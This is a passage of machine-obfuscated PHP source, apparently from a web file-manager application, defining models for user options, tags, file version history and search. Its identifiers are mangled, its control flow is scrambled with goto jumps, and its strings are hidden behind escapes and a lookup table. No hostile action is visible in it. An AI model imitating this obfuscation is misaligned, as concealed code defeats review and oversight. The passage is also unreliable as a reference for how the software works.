$bæ ªœ‚¾ = Model($d„˜Í‹øè[2499])->field($d„˜Í‹øè[2500])->where($CºÒˆåÃæ)->select(); $DŒºİŠ‹îÔ = array_to_keyvalue($bæ ªœ‚¾, $d„˜Í‹øè[2079], $d„˜Í‹øè[28]); goto C—ÎÚ¯äã‚; C—ÎÚ¯äã‚: $e°Š¦´¼ùª = array_to_keyvalue_group($e°Š¦´¼ùª, $d„˜Í‹øè[1416]); foreach ($e°Š¦´¼ùª as &$AòÇí—·ìù) { $aè¶Ç³šĞ = array(); foreach ($AòÇí—·ìù as $cˆŸ¾é‚åĞ) { if (!$cˆŸ¾é‚åĞ[$d„˜Í‹øè[2207]]) { continue; } $D¬¸¨ë¢‘Ä = Model($d„˜Í‹øè[2226])->listData($cˆŸ¾é‚åĞ[$d„˜Í‹øè[2207]]); $aè¶Ç³šĞ[] = array($d„˜Í‹øè[2079] => $cˆŸ¾é‚åĞ[$d„˜Í‹øè[2079]], $d„˜Í‹øè[2501] => $DŒºİŠ‹îÔ[$cˆŸ¾é‚åĞ[$d„˜Í‹øè[2079]]], $d„˜Í‹øè[373] => $D¬¸¨ë¢‘Ä); } $AòÇí—·ìù = $aè¶Ç³šĞ; } foreach ($c¸²ãÉ as &$bÁğÊË»‡™) { $bÁğÊË»‡™[$d„˜Í‹øè[2497]] = array(); if (isset($e°Š¦´¼ùª[$bÁğÊË»‡™[$d„˜Í‹øè[1416]]])) { $bÁğÊË»‡™[$d„˜Í‹øè[2497]] = $e°Š¦´¼ùª[$bÁğÊË»‡™[$d„˜Í‹øè[1416]]]; } } goto DäŒ¡Œ‰òÂ; d‚ÁÕÁƒÂ†: $d„˜Í‹øè =& $_SERVER[Äº¡•ô™Ÿ]; $CºÒˆåÃæ = array($d„˜Í‹øè[1416] => array($d„˜Í‹øè[7], $EÉÑ§Æ§°Ö)); $e°Š¦´¼ùª = Model($d„˜Í‹øè[2153])->where($CºÒˆåÃæ)->select(); goto e°ÇóÛÏŞœ; e°ÇóÛÏŞœ: $E¤ĞÇ•Ùöó = array_to_keyvalue($e°Š¦´¼ùª, $d„˜Í‹øè[33], $d„˜Í‹øè[2079]); $E¤ĞÇ•Ùöó = array_remove_value(array_unique($E¤ĞÇ•Ùöó), $d„˜Í‹øè[464]); if (!$E¤ĞÇ•Ùöó || !$e°Š¦´¼ùª) { return; } goto eß¢Îƒ³ó…; DäŒ¡Œ‰òÂ: } private function _listAppendMeta(&$BÇÃ™¨Éˆ, $f›‹Ö±±Ù™) { goto Eğ®ã’éµÒ; bôÑ±’Ï­: $d¬éä“… = array($B¢˜Ã„ªÒ¡[1416] => array($B¢˜Ã„ªÒ¡[7], $f›‹Ö±±Ù™)); $Eµä¿÷ˆ± = Model($B¢˜Ã„ªÒ¡[2475])->where($d¬éä“…)->select(); $Eµä¿÷ˆ± = array_to_keyvalue_group($Eµä¿÷ˆ±, $B¢˜Ã„ªÒ¡[1416]); goto c·Ú×½’ˆ; c·Ú×½’ˆ: foreach ($Eµä¿÷ˆ± as &$d‚¼®êö…—) { $BÈ¢ÜªÓãõ = array(); foreach ($d‚¼®êö…— as $bŸ‰°îÓö) { if (!in_array($bŸ‰°îÓö[$B¢˜Ã„ªÒ¡[89]], $e¨¥……¦éö)) { $BÈ¢ÜªÓãõ[$bŸ‰°îÓö[$B¢˜Ã„ªÒ¡[89]]] = $bŸ‰°îÓö[$B¢˜Ã„ªÒ¡[356]]; } } $d‚¼®êö…— = $BÈ¢ÜªÓãõ; } $D”†® µĞÔ = Model($B¢˜Ã„ªÒ¡[2502]); foreach ($BÇÃ™¨Éˆ as &$D¾Ş º¶Ô) { $B¢ë…Ööº = array(); if (isset($Eµä¿÷ˆ±[$D¾Ş º¶Ô[$B¢˜Ã„ªÒ¡[1416]]])) { $B¢ë…Ööº = $Eµä¿÷ˆ±[$D¾Ş º¶Ô[$B¢˜Ã„ªÒ¡[1416]]]; } $D¾Ş º¶Ô[$B¢˜Ã„ªÒ¡[2503]] = array(); if (isset($B¢ë…Ööº[$C„ÊƒèÙÉº])) { $D¾Ş º¶Ô[$B¢˜Ã„ªÒ¡[2503]] = $D”†® µĞÔ->getUserJobInfo($B¢ë…Ööº[$C„ÊƒèÙÉº]); } } goto fïÕšç×¡ö; Eğ®ã’éµÒ: $B¢˜Ã„ªÒ¡ =& $_SERVER[Äº¡•ô™Ÿ]; $C„ÊƒèÙÉº = UserJobModel::JOB_KEY; $e¨¥……¦éö = array($B¢˜Ã„ªÒ¡[2478]); goto bôÑ±’Ï­; fïÕšç×¡ö: } public function userSearch($AĞóß‘ùƒ, $BÉ’Í‡ğÍä = "\52") { return Model($_SERVER[Äº¡•ô™Ÿ][473])->where($AĞóß‘ùƒ)->field($BÉ’Í‡ğÍä)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\157\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cÈİ½†œÜ) { $eÒ­´ÁîØâ =& $_SERVER[Äº¡•ô™Ÿ]; if (!defined($eÒ­´ÁîØâ[423])) { define($eÒ­´ÁîØâ[423], 0); } return "\x55\163\x65\162\x4f\160\x74\151\157\x6e\x5f{$cÈİ½†œÜ}\137" . USER_ID; } protected function filterWhere($f×µÔã˜) { $A¶©›Êâ…  =& $_SERVER[Äº¡•ô™Ÿ]; if (!defined($A¶©›Êâ… [423])) { define($A¶©›Êâ… [423], 0); } $f×µÔã˜[$A¶©›Êâ… [1416]] = USER_ID; return $f×µÔã˜; } public function cacheRemoveUser($D‡Ñ•ÉËÕ, $D•ê—»áÍˆ) { return Cache::remove("\x55\x73\x65\162\117\160\164\151\157\x6e\137{$D‡Ñ•ÉËÕ}\x5f" . $D•ê—»áÍˆ); } protected function optionDefault($F©ƒ„ìÂÕ = '') { $CÑœ„¨‘ =& $_SERVER[Äº¡•ô™Ÿ]; if ($F©ƒ„ìÂÕ == $CÑœ„¨‘[33]) { return $GLOBALS[$CÑœ„¨‘[6]][$CÑœ„¨‘[2504]]; } if ($F©ƒ„ìÂÕ == $CÑœ„¨‘[2505]) { return $GLOBALS[$CÑœ„¨‘[6]][$CÑœ„¨‘[2506]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\x74\141\x67\114\x69\163\x74"; public $modelType = "\x55\x73\x65\x72\x4f\x70\x74\151\x6f\156"; public $field = array("\156\x61\155\145", "\163\164\171\154\145", "\163\x6f\162\164"); public function listData($BÊİ§¶¯¯Ì = false, $BÈˆØ½è = "\163\x6f\x72\164", $bäê›‰µâ = false) { return parent::listData($BÊİ§¶¯¯Ì, $BÈˆØ½è, $bäê›‰µâ); } public function remove($fó‰Œˆ±¼) { return parent::remove($fó‰Œˆ±¼); } public function add($e«›ôù¿®¨, $b¯¯İ¸Îğ¿ = "\x6c\x61\x62\x65\x6c\x2d\x67\162\x65\171\55\156\x6f\x72\x6d\x61\x6c") { $CÚó¢ÎšÃ¨ =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->findByName($e«›ôù¿®¨)) { return !1; } $bƒà³Ã´©‰ = array($CÚó¢ÎšÃ¨[383] => $e«›ôù¿®¨, $CÚó¢ÎšÃ¨[433] => $b¯¯İ¸Îğ¿, $CÚó¢ÎšÃ¨[2083] => $this->getSort($CÚó¢ÎšÃ¨[243]) + 1); return parent::insert($bƒà³Ã´©‰); } public function update($B¥È£ƒÙñ, $Bäéê‚…‰) { $AêœÎ–¨µë =& $_SERVER[Äº¡•ô™Ÿ]; $E¾ùÍ©Ÿë´ = $this->listData($B¥È£ƒÙñ); $EôØ¥–×îá = $this->findByName($Bäéê‚…‰[$AêœÎ–¨µë[28]]); if (!$E¾ùÍ©Ÿë´ || $EôØ¥–×îá && $EôØ¥–×îá[$AêœÎ–¨µë[364]] != $E¾ùÍ©Ÿë´[$AêœÎ–¨µë[364]]) { return !1; } return parent::update($B¥È£ƒÙñ, $Bäéê‚…‰); } public function moveTop($A¡¿³ ­©Ï) { $EÃììÚ¶Ê¸ =& $_SERVER[Äº¡•ô™Ÿ]; $aíßéŠóÑŒ = parent::listData(); $d˜ôĞñé… = $this->getSort($EÃììÚ¶Ê¸[242]); foreach ($aíßéŠóÑŒ as &$f¦¹¢ê¯ñÚ) { if ($f¦¹¢ê¯ñÚ[$EÃììÚ¶Ê¸[364]] == $A¡¿³ ­©Ï) { $f¦¹¢ê¯ñÚ[$EÃììÚ¶Ê¸[2100]] = $d˜ôĞñé…; continue; } $f¦¹¢ê¯ñÚ[$EÃììÚ¶Ê¸[2100]] += 1; } return parent::resetData($aíßéŠóÑŒ); } public function moveBottom($b‰¨ÓœÀ) { $E‘ê¼Ëß¶ç =& $_SERVER[Äº¡•ô™Ÿ]; $Fôá‡íÓ£‰ = $this->getSort($E‘ê¼Ëß¶ç[243]) + 1; return parent::update($b‰¨ÓœÀ, array($E‘ê¼Ëß¶ç[2100] => $Fôá‡íÓ£‰)); } public function resetSort($dŒè¾åŠÄâ) { goto dò‹“Üˆ½Á; dò‹“Üˆ½Á: $BÖ¾ÀùŒÆÈ =& $_SERVER[Äº¡•ô™Ÿ]; $EíÉ¢ôÊèÁ = array(); $dŒè¾åŠÄâ = is_array($dŒè¾åŠÄâ) ? $dŒè¾åŠÄâ : array(); goto DÖ»ç¹æÕ×; DÖ»ç¹æÕ×: for ($a¢†‰™Š§³ = 0; $a¢†‰™Š§³ < count($dŒè¾åŠÄâ); $a¢†‰™Š§³++) { $EíÉ¢ôÊèÁ[$dŒè¾åŠÄâ[$a¢†‰™Š§³] . $BÖ¾ÀùŒÆÈ[33]] = $a¢†‰™Š§³ + 1; } $Dì÷¼…“ƒ¹ = parent::listData(); foreach ($Dì÷¼…“ƒ¹ as &$a“»ñ‰ë­) { $e¶‰œ‰ÜìĞ = $EíÉ¢ôÊèÁ[$a“»ñ‰ë­[$BÖ¾ÀùŒÆÈ[364]]]; $a“»ñ‰ë­[$BÖ¾ÀùŒÆÈ[2100]] = $e¶‰œ‰ÜìĞ ? $e¶‰œ‰ÜìĞ : $a“»ñ‰ë­[$BÖ¾ÀùŒÆÈ[2100]]; } goto a¥Ë¸‰¿®”; a¥Ë¸‰¿®”: return parent::resetData($Dì÷¼…“ƒ¹); goto cŠ³ãÈÎ×; cŠ³ãÈÎ×: } private function getSort($D—†‘ğåÉ§) { $AŠª–ÒŸ‰ä =& $_SERVER[Äº¡•ô™Ÿ]; $EÇãí‘ˆÌğ = parent::listData(); $Aõ¬™åº½ = array_to_keyvalue($EÇãí‘ˆÌğ, $AŠª–ÒŸ‰ä[33], $AŠª–ÒŸ‰ä[2100]); if (!$Aõ¬™åº½) { $Aõ¬™åº½ = array(0); } $AíµÍ²¦Åº = $D—†‘ğåÉ§ == $AŠª–ÒŸ‰ä[243] ? max($Aõ¬™åº½) : min($Aõ¬™åº½); return intval($AíµÍ²¦Åº); } } goto cøºÃ×›ìÆ; f“¥êÓÊø: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\145\x5f\150\151\163\x74\x6f\x72\x79"; public function addHistory($B¹ƒ‹ÆÏ…, $CĞŞôŞ« = '') { $aŞ‡“—í¡¤ =& $_SERVER[Äº¡•ô™Ÿ]; $FÇ¾ÀÂ„Ó‹ = array($aŞ‡“—í¡¤[380] => $B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[366]], $aŞ‡“—í¡¤[1407] => isset($B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[376]]) ? $B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[376]] : $B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[375]], $aŞ‡“—í¡¤[416] => $B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[415]], $aŞ‡“—í¡¤[516] => $B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[77]], $aŞ‡“—í¡¤[2264] => $CĞŞôŞ«); $d„É’ÖİíÕ = $GLOBALS[$aŞ‡“—í¡¤[6]][$aŞ‡“—í¡¤[84]][$aŞ‡“—í¡¤[2265]]; if ($d„É’ÖİíÕ > 1) { $this->historyAutoClear($FÇ¾ÀÂ„Ó‹[$aŞ‡“—í¡¤[366]]); $this->add($FÇ¾ÀÂ„Ó‹); } Model($aŞ‡“—í¡¤[2266])->eventFileEdit($B¹ƒ‹ÆÏ…[$aŞ‡“—í¡¤[366]]); } private function historyAutoClear($bÁ‰Ÿã¦µÇ) { goto d³ãœ·†»; F¡Ş»Ã©§ˆ: if (!$A›¬¼ÈªÍÈ || $f¯£©ÔêÕ >= count($A›¬¼ÈªÍÈ)) { return; } $Bâôé“Òí½ = array_to_keyvalue($A›¬¼ÈªÍÈ, $bÉİñà†[33], $bÉİñà†[364]); $Bâôé“Òí½ = array_slice($Bâôé“Òí½, $f¯£©ÔêÕ); goto fÊæìÏëªø; d³ãœ·†»: $bÉİñà† =& $_SERVER[Äº¡•ô™Ÿ]; $f‡øëïíƒ = Model($bÉİñà†[1088])->get($bÉİñà†[2267]); $D÷¸º¬Â« = $GLOBALS[$bÉİñà†[6]][$bÉİñà†[84]][$bÉİñà†[2265]]; goto cêÆÄåôÏÃ; fÊæìÏëªø: $a‚Î»É‡Ï = array_to_keyvalue($A›¬¼ÈªÍÈ, $bÉİñà†[33], $bÉİñà†[415]); $a‚Î»É‡Ï = array_slice($a‚Î»É‡Ï, $f¯£©ÔêÕ); if (!$Bâôé“Òí½ || !$a‚Î»É‡Ï) { return; } goto D©„­ó›¢Œ; D©„­ó›¢Œ: $CğÅöš£­§ = array($bÉİñà†[382] => array($bÉİñà†[7], $Bâôé“Òí½)); $this->where($CğÅöš£­§)->delete(); Model($bÉİñà†[418])->remove($a‚Î»É‡Ï); goto C©ÒÖïÖ¾ò; D¨’ÓÍ×: if ($f¯£©ÔêÕ >= 500) { return; } $CğÅöš£­§ = array($bÉİñà†[380] => $bÁ‰Ÿã¦µÇ); $A›¬¼ÈªÍÈ = $this->field($bÉİñà†[2269])->where($CğÅöš£­§)->order($bÉİñà†[2261])->select(); goto F¡Ş»Ã©§ˆ; cêÆÄåôÏÃ: $BîŒàîÒÆ£ = $f‡øëïíƒ == $bÉİñà†[2268] ? 3 : $D÷¸º¬Â«; if ($D÷¸º¬Â« <= 1) { $BîŒàîÒÆ£ = 1; } $f¯£©ÔêÕ = $BîŒàîÒÆ£ - 1; goto D¨’ÓÍ×; C©ÒÖïÖ¾ò: } public function listData($cå´ Õ’–) { goto bõîò¿ ¼; bõîò¿ ¼: $cÆ¸°Œ›ù =& $_SERVER[Äº¡•ô™Ÿ]; $D«‹¡ø¬îÛ = array($cÆ¸°Œ›ù[380] => $cå´ Õ’–); $FãŸ™°ÛˆÖ = $cÆ¸°Œ›ù[2270]; goto c²“‡ã”ìİ; B×Ğß»øÎÄ: $D·Ôëã„›¦ = 3; if ($Aå¸Ïæ…â == $cÆ¸°Œ›ù[2268]) { $Eö×Û®‹”È[$cÆ¸°Œ›ù[351]] = array_slice($Eö×Û®‹”È[$cÆ¸°Œ›ù[351]], 0, $D·Ôëã„›¦); $Eö×Û®‹”È[$cÆ¸°Œ›ù[348]] = array($cÆ¸°Œ›ù[2271] => 1, $cÆ¸°Œ›ù[2272] => 20, $cÆ¸°Œ›ù[2273] => 1, $cÆ¸°Œ›ù[2274] => count($Eö×Û®‹”È[$cÆ¸°Œ›ù[351]])); } return $Eö×Û®‹”È; goto e¡íò÷õÊ; c²“‡ã”ìİ: $Eö×Û®‹”È = $this->field($FãŸ™°ÛˆÖ)->where($D«‹¡ø¬îÛ)->order($cÆ¸°Œ›ù[2261])->selectPage(); $this->_listAppendUser($Eö×Û®‹”È[$cÆ¸°Œ›ù[351]]); $Aå¸Ïæ…â = Model($cÆ¸°Œ›ù[1088])->get($cÆ¸°Œ›ù[2267]); goto B×Ğß»øÎÄ; e¡íò÷õÊ: } protected function _listAppendUser(&$aÍĞÊƒç­Ë) { $aœÒŞàË =& $_SERVER[Äº¡•ô™Ÿ]; $fçÛ¬ÕÍË = array_to_keyvalue($aÍĞÊƒç­Ë, $aœÒŞàË[33], $aœÒŞàË[1416]); $D¾óŠŸ÷³õ = Model($aœÒŞàË[473])->userListInfo($fçÛ¬ÕÍË); foreach ($aÍĞÊƒç­Ë as &$b£ŒÅíô„) { $fÙø·è„ = $b£ŒÅíô„[$aœÒŞàË[1416]]; $b£ŒÅíô„[$aœÒŞàË[375]] = $D¾óŠŸ÷³õ[$fÙø·è„] ? $D¾óŠŸ÷³õ[$fÙø·è„] : !1; } } public function fileInfo($fÑİÄƒ„¦‚) { $B¬§ºäĞ© =& $_SERVER[Äº¡•ô™Ÿ]; $eäƒñ¹ö„Â = $this->tablePrefix; $AïÎò‹Ê÷ = "{$eäƒñ¹ö„Â}\x69\x6f\x5f\x66\x69\154\145\40\x66\x69\154\x65\x73\x20\157\x6e\40\x66\151\154\145\163\56\x66\151\154\145\x49\104\x20\75\40\150\x69\163\x74\157\x72\171\x2e\146\151\154\x65\x49\x44"; return $this->alias($B¬§ºäĞ©[2275])->where(array($B¬§ºäĞ©[382] => $fÑİÄƒ„¦‚))->join($AïÎò‹Ê÷, $B¬§ºäĞ©[2276])->find(); } public function removeItem($D¢ÇÏ¡†›“) { $eÃ¹™ÄÜŒø =& $_SERVER[Äº¡•ô™Ÿ]; $E„í´ÕÅÃ… = array($eÃ¹™ÄÜŒø[382] => $D¢ÇÏ¡†›“); $aÈê¦ÑÃç‰ = $this->where($E„í´ÕÅÃ…)->find(); if ($aÈê¦ÑÃç‰) { $cÆœŞœĞé¥ = $this->where($E„í´ÕÅÃ…)->delete(); Model($eÃ¹™ÄÜŒø[418])->remove($aÈê¦ÑÃç‰[$eÃ¹™ÄÜŒø[415]]); return $cÆœŞœĞé¥; } return !1; } public function removeBySource($e¡™£ØÍ†Ë) { goto EÉ‚ì²¿»à; EÉ‚ì²¿»à: $aç¢™Ó‡ß¶ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$e¡™£ØÍ†Ë) { return !1; } if (!is_array($e¡™£ØÍ†Ë)) { $e¡™£ØÍ†Ë = array($e¡™£ØÍ†Ë); } goto FàÛÜˆÔí·; fÊÄõ‚Œöì: return !0; goto c•àÑŒˆ²¸; FàÛÜˆÔí·: $b‰ö»º¯Š® = array($aç¢™Ó‡ß¶[380] => array($aç¢™Ó‡ß¶[7], $e¡™£ØÍ†Ë)); $F…ë¢‰ã•¦ = $this->field($aç¢™Ó‡ß¶[416])->where($b‰ö»º¯Š®)->select(); if ($F…ë¢‰ã•¦) { $this->where($b‰ö»º¯Š®)->delete(); $cÙÔ‡Ö—í‰ = array_to_keyvalue($F…ë¢‰ã•¦, $aç¢™Ó‡ß¶[33], $aç¢™Ó‡ß¶[415]); Model($aç¢™Ó‡ß¶[418])->remove($cÙÔ‡Ö—í‰); } goto fÊÄõ‚Œöì; c•àÑŒˆ²¸: } public function setDetail($Eæ¤îŒÈ“”, $B®í©Ü‹ã¡) { $C™·¶§â¬£ =& $_SERVER[Äº¡•ô™Ÿ]; return $this->where(array($C™·¶§â¬£[382] => $Eæ¤îŒÈ“”))->save(array($C™·¶§â¬£[2264] => $B®í©Ü‹ã¡)); } public function rollbackToItem($E£ÉÎ¹»ïì, $AÇÆÃÑ¨ÀÙ) { goto E¼ÛøÎŒÅã; Fö¦°¸óÈ«: $CùÖ¿ä’Ÿ‡ = $this->find($AÇÆÃÑ¨ÀÙ); $D½ÀÎ±Åæ¬ = array($dˆñ†ôÎÛ[415] => $CùÖ¿ä’Ÿ‡[$dˆñ†ôÎÛ[415]], $dˆñ†ôÎÛ[77] => $CùÖ¿ä’Ÿ‡[$dˆñ†ôÎÛ[77]], $dˆñ†ôÎÛ[107] => time(), $dˆñ†ôÎÛ[376] => USER_ID); Model($dˆñ†ôÎÛ[755])->where(array($dˆñ†ôÎÛ[366] => $E£ÉÎ¹»ïì))->save($D½ÀÎ±Åæ¬); goto bƒÆšÛ³°º; E¼ÛøÎŒÅã: $dˆñ†ôÎÛ =& $_SERVER[Äº¡•ô™Ÿ]; $cµĞòëòß° = Model($dˆñ†ôÎÛ[755])->sourceInfo($E£ÉÎ¹»ïì); $this->addHistory($cµĞòëòß°); goto Fö¦°¸óÈ«; bƒÆšÛ³°º: return $this->where(array($dˆñ†ôÎÛ[382] => $AÇÆÃÑ¨ÀÙ))->delete(); goto B˜”ï„³Ê²; B˜”ï„³Ê²: } public function clearSame($Eï¡‚á£ïŸ) { goto fùÉÇÌì°; CÙóÑÇ£: if (!$a¨³öˆèÄ) { return; } $this->where(array($A¡šµù„óÛ[364] => array($A¡šµù„óÛ[7], $a¨³öˆèÄ)))->delete(); Model($A¡šµù„óÛ[418])->remove($b“õñôä£Ã); goto BÚœ”¾Ş¿; fùÉÇÌì°: $A¡šµù„óÛ =& $_SERVER[Äº¡•ô™Ÿ]; $fÛ¾ö‹‚×¾ = $this->listData($Eï¡‚á£ïŸ); $aÈˆå‰Û = array_to_keyvalue_group($fÛ¾ö‹‚×¾, $A¡šµù„óÛ[415]); goto b·Î¾Â†…; b·Î¾Â†…: $b“õñôä£Ã = array(); $a¨³öˆèÄ = array(); foreach ($aÈˆå‰Û as $Cï«˜Òâ½¶) { if (!$Cï«˜Òâ½¶ || count($Cï«˜Òâ½¶) <= 1) { continue; } foreach ($Cï«˜Òâ½¶ as $c¡Ÿ™¼ˆ‚) { $b“õñôä£Ã[] = $c¡Ÿ™¼ˆ‚[$A¡šµù„óÛ[415]]; $a¨³öˆèÄ[] = $c¡Ÿ™¼ˆ‚[$A¡šµù„óÛ[364]]; } } goto CÙóÑÇ£; BÚœ”¾Ş¿: } public function userSpace() { $AØ¹–ˆŠÄ† =& $_SERVER[Äº¡•ô™Ÿ]; $AëƒìßÌŠï = $this->tablePrefix; $AÇö¸‡áÛÅ = array($AØ¹–ˆŠÄ†[1407] => USER_ID); $Cñ·—éÃĞ = "{$AëƒìßÌŠï}\151\x6f\x5f\x66\x69\x6c\x65\x20\146\x69\154\x65\163\x20\157\x6e\40\146\151\154\x65\163\56\146\x69\154\x65\x49\x44\40\75\x20\150\151\163\x74\157\162\x79\56\x66\151\154\145\111\x44"; return $this->alias($AØ¹–ˆŠÄ†[2275])->where($AÇö¸‡áÛÅ)->join($Cñ·—éÃĞ, $AØ¹–ˆŠÄ†[2276])->sum($AØ¹–ˆŠÄ†[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E‘‡Öæ»œ) { goto F‹ä†Ï‚á; F‹ä†Ï‚á: $A­’¿ğÄ“ª =& $_SERVER[Äº¡•ô™Ÿ]; $e¦¬êÛÒÍ = KodIO::fileTypeList(); $cõ¹àÊ…ò… = $e¦¬êÛÒÍ[$E‘‡Öæ»œ]; goto A–“‰ñ·ÏÚ; c¸‡™†´™: if (!$cõ¹àÊ…ò…[$A­’¿ğÄ“ª[157]]) { $AìÅÂŒ®Â× = array_to_keyvalue($e¦¬êÛÒÍ, $A­’¿ğÄ“ª[33], $A­’¿ğÄ“ª[157]); $bÜ†áˆÚŠ“ = implode($A­’¿ğÄ“ª[47], $AìÅÂŒ®Â×); $CØ‡Øˆ­ÆŒ = $A­’¿ğÄ“ª[2233]; } $bÙ…İææ¥ñ = explode($A­’¿ğÄ“ª[47], trim($bÜ†áˆÚŠ“, $A­’¿ğÄ“ª[47])); return array($CØ‡Øˆ­ÆŒ, $bÙ…İææ¥ñ); goto EËˆ©†‹æ–; A–“‰ñ·ÏÚ: if (!$cõ¹àÊ…ò…) { return array(); } $bÜ†áˆÚŠ“ = $cõ¹àÊ…ò…[$A­’¿ğÄ“ª[157]]; $CØ‡Øˆ­ÆŒ = $A­’¿ğÄ“ª[7]; goto c¸‡™†´™; EËˆ©†‹æ–: } public function listPathType($cİ¢§³œ) { $Bœ›Š½äÖ˜ =& $_SERVER[Äº¡•ô™Ÿ]; $féÇ“áÁ“‡ = $this->fileTypeWhere($cİ¢§³œ); if (!$féÇ“áÁ“‡) { return array(); } $B—‰ÎÙÂ›— = array($Bœ›Š½äÖ˜[517] => SourceModel::TYPE_USER, $Bœ›Š½äÖ˜[518] => USER_ID, $Bœ›Š½äÖ˜[514] => 0, $Bœ›Š½äÖ˜[515] => $féÇ“áÁ“‡); return $this->listSource($B—‰ÎÙÂ›—); } public function listSearch($b­¸­é¤, $c×Í¼˜¥¹Û = 300) { goto eØÍŞ °˜ñ; BŒÇ“Õ‰Şå: $this->_listSearchBindPinyin($b­¸­é¤, $E„áõÈÑŠ, $aÙ¨éƒÏ¶§); $this->alias($D³Ç¬Ù¤õ˜[483])->_makeOrder()->cache(null, 10); $d™†İ·ïŠ = $this->distinct(!0)->field($aÙ¨éƒÏ¶§)->where($E„áõÈÑŠ)->selectPage($c×Í¼˜¥¹Û); goto e§Ç¾¦­‡ô; d¶ŒÈß„‰¾: $this->_listMake($d™†İ·ïŠ); return $d™†İ·ïŠ; goto Bç—¾Õ‹‘; eØÍŞ °˜ñ: $D³Ç¬Ù¤õ˜ =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($b­¸­é¤[$D³Ç¬Ù¤õ˜[2155]]) && $b­¸­é¤[$D³Ç¬Ù¤õ˜[2155]]) { $b­¸­é¤[$D³Ç¬Ù¤õ˜[2155]] = str_replace($D³Ç¬Ù¤õ˜[1568], $D³Ç¬Ù¤õ˜[2277], trim($b­¸­é¤[$D³Ç¬Ù¤õ˜[2155]])); } $E„áõÈÑŠ = $this->_parseSearchWhere($b­¸­é¤); goto Céœó¶àøÒ; Céœó¶àøÒ: if (!isset($E„áõÈÑŠ[$D³Ç¬Ù¤õ˜[393]])) { $E„áõÈÑŠ[$D³Ç¬Ù¤õ˜[393]] = 0; } $aÙ¨éƒÏ¶§ = $D³Ç¬Ù¤õ˜[2278]; $b¶ÏÛ¨‡ = $aÙ¨éƒÏ¶§; goto BŒÇ“Õ‰Şå; e§Ç¾¦­‡ô: $this->_listSearchDesc($d™†İ·ïŠ, $b­¸­é¤, $b¶ÏÛ¨‡); $this->_listSearchTag($d™†İ·ïŠ, $b­¸­é¤, $b¶ÏÛ¨‡); $this->_listDataApply($d™†İ·ïŠ[$D³Ç¬Ù¤õ˜[351]]); goto d¶ŒÈß„‰¾; Bç—¾Õ‹‘: } private function _listSearchTag(&$bî¾¹¥ŒÎ², $e×´ÖÆ®“Õ, $AÌ‘»ƒ„ƒÇ) { goto EÛ²¿ĞÙÃ†; A„ÉßØÚˆ: $f‹ÓöŸáÕ = array(); $DÎˆŞ¥‘Û = $e×´ÖÆ®“Õ[$F¬‘¼Í§ê[2155]]; foreach ($C¯è³©É‚ as $C¨²íÅ ¡) { $cãŞµ×‚¨ = $C¨²íÅ ¡[$F¬‘¼Í§ê[28]]; $cãšÔˆ›‰¼ = str_replace($F¬‘¼Í§ê[50], $F¬‘¼Í§ê[33], Pinyin::encode($cãŞµ×‚¨)); if (stripos($cãŞµ×‚¨, $DÎˆŞ¥‘Û) !== !1 || stripos($cãšÔˆ›‰¼, $DÎˆŞ¥‘Û) !== !1) { $f‹ÓöŸáÕ[] = $C¨²íÅ ¡[$F¬‘¼Í§ê[364]]; } } goto bËóõìÑ³; E¤©áÂâÉÊ: $eµ¢©ùêÑ = array_to_keyvalue($eµ¢©ùêÑ, $F¬‘¼Í§ê[33], $F¬‘¼Í§ê[75]); $E‘ˆ¨¸á§  = array_unique($eµ¢©ùêÑ); $this->_listSearchMerge($bî¾¹¥ŒÎ², $e×´ÖÆ®“Õ, $AÌ‘»ƒ„ƒÇ, $E‘ˆ¨¸á§ ); goto bœÓƒ×¶; EÛ²¿ĞÙÃ†: $F¬‘¼Í§ê =& $_SERVER[Äº¡•ô™Ÿ]; if (!$e×´ÖÆ®“Õ[$F¬‘¼Í§ê[2155]] || $bî¾¹¥ŒÎ²[$F¬‘¼Í§ê[348]][$F¬‘¼Í§ê[337]] > 1) { return; } $C¯è³©É‚ = Model($F¬‘¼Í§ê[2279])->listData(); goto A„ÉßØÚˆ; bËóõìÑ³: if (!$f‹ÓöŸáÕ) { return; } $D«¸êµ›Úê = array($F¬‘¼Í§ê[390] => array($F¬‘¼Í§ê[7], $f‹ÓöŸáÕ)); $eµ¢©ùêÑ = Model($F¬‘¼Í§ê[2280])->field($F¬‘¼Í§ê[75])->where($D«¸êµ›Úê)->select(); goto E¤©áÂâÉÊ; bœÓƒ×¶: } private function _listSearchDesc(&$Bàì—ë÷÷¹, $D®Í¨º“íº, $BŠ·§Š«) { goto a÷ˆĞ¿Ì™; a÷ˆĞ¿Ì™: $c®„ø·İâ“ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$D®Í¨º“íº[$c®„ø·İâ“[2155]] || $Bàì—ë÷÷¹[$c®„ø·İâ“[348]][$c®„ø·İâ“[337]] > 1) { return; } $fëÅÀ­Ùœ¶ = $this->listSearchChildren($D®Í¨º“íº[$c®„ø·İâ“[457]]); goto bÆ«Üí¡×ğ; DÖÃó¦ÉÂ—: $cë¦¸í®È™ = Model($c®„ø·İâ“[500])->field($c®„ø·İâ“[366])->where($cù´ÜÏİÓ)->select(); $C’ŒÆ¹ˆÀ‹ = array_to_keyvalue($cë¦¸í®È™, $c®„ø·İâ“[33], $c®„ø·İâ“[366]); $this->_listSearchMerge($Bàì—ë÷÷¹, $D®Í¨º“íº, $BŠ·§Š«, $C’ŒÆ¹ˆÀ‹); goto fâ³ÅÈ˜”; bÆ«Üí¡×ğ: $fëÅÀ­Ùœ¶ = array_unique($fëÅÀ­Ùœ¶); if (!$fëÅÀ­Ùœ¶) { return; } $cù´ÜÏİÓ = array($c®„ø·İâ“[366] => array($c®„ø·İâ“[7], $fëÅÀ­Ùœ¶), $c®„ø·İâ“[89] => 